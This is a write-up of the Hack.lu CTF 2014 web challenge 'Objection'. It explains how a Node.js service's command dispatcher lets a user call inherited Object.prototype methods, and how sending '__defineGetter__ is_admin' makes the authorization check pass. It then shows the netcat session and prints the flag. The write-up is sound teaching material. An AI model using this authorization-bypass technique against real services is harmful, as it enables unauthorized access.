# Hack.lu CTF 2014: Objection

**Category:** Web
**Points:** 150
**Author:** TheJH
**Description:**

> This guard talks a weird dialect. And why does he talk in such a complicated way?
>
> Download: [objection_4966674d17ff296939c0e3dfccfe87ed.co](objection_4966674d17ff296939c0e3dfccfe87ed.co)
>
> `nc wildwildweb.fluxfingers.net 1408`

## Write-up

[The provided `objection_4966674d17ff296939c0e3dfccfe87ed.co` file](objection_4966674d17ff296939c0e3dfccfe87ed.co) resembles a Node.js app, except it’s written in “a weird dialect” instead of in JavaScript. This is [Coco](https://github.com/satyr/coco#readme), which is in turn a dialect of [CoffeeScript](http://coffeescript.org/). Let’s [compile the Coco code to JavaScript](objection.js), since we’re more familiar with that language:

```bash
$ coco -c -p objection_4966674d17ff296939c0e3dfccfe87ed.co > objection.js
```

[The source code](objection.js) reveals that the program accepts commands as input:

* `login $password` attempts to login using `$password` as the password
* `get_token` reveals the token if you’re logged in as admin

Since we don’t know the admin password, we’ll have to find another way to set `client_context.is_admin` to a truthy value, to avoid hitting this `if` branch:

```js
if (!this.is_admin) {
  return cb("You are not authorized to perform this action.");
}
```

Let’s take a look at the code that parses our input:

```js
var ref$, funcname, args;
it = it.toString('utf8');
console.log("got line: " + it);
ref$ = it.split(' ');
funcname = ref$[0];
args = slice$.call(ref$, 1);
if (typeof client_context[funcname] !== 'function') {
  return con.write("error: unknown function " + funcname + "\n");
}
return client_context[funcname](args, function(it){
  return con.write(it + "\n");
});
```

The program accepts any command `funcname` as long as `client_context[funcname]` is a JavaScript function object. This means we’re not limited to the custom `login` and `get_token` methods – we can also use function properties that are inherited from the global `Object.prototype`. Using [some old code](https://github.com/mathiasbynens/tpyo/blob/b76ca2f4d7726c51c2f8c779d73773de91f86a56/tpyo.js#L7-L22), we quickly created the following list of such properties that are available in Node.js (which is based on the V8 engine):

* `constructor`
* `hasOwnProperty`
* `isPrototypeOf`
* `propertyIsEnumerable`
* `toLocaleString`
* `toString`
* `valueOf`
* `__defineGetter__`
* `__defineSetter__`
* `__lookupGetter__`
* `__lookupSetter__`

If we enter [`__defineGetter__`](https://javascript.spec.whatwg.org/#object.prototype.__definegetter__) as the command name and `is_admin` as its argument, the following code is executed:

```js
client_context.__defineGetter__(['is_admin'], function(it) {
  return con.write(it + "\n");
});
```

After that, every time `client_context.is_admin` is accessed, it results in [the return value of `con.write(it + "\n")`](https://nodejs.org/api/net.html#net_socket_write_data_encoding_callback) instead of its initial value `false`. This means we can call `get_token` afterwards. Bingo!

```bash
$ nc wildwildweb.fluxfingers.net 1408
hello!
__defineGetter__ is_admin
get_token
undefined
The current token is flag{real_cowboys_dont_use_object_create_null}
```

The flag is `flag{real_cowboys_dont_use_object_create_null}`.

## Other write-ups and resources

* <http://akaminsky.net/hack-lu-ctf-2014-web-150-objection/>
* [Exploit in Python by @TheJH](thejh_exploit.py)
